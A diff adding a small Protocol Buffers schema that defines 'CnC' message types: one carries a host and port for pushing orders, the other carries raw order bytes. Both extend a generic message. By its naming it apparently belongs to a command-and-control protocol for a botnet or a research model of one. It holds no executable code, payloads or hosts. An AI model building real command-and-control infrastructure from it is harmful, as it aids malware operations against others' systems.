@@ -1,0 +1,18 @@
+import "genericmessage.proto";
+
+message CnCPushOrdersMessage {
+	required string host = 1;
+	required uint32 port = 2;
+}
+
+message CnCHostOrdersMessage {
+	required bytes orders = 1;
+}
+
+extend GenericMessage {
+	required CnCPushOrdersMessage cnc_push = 200;
+}
+
+extend GenericMessage {
+	required CnCHostOrdersMessage cnc_host = 201;
+}
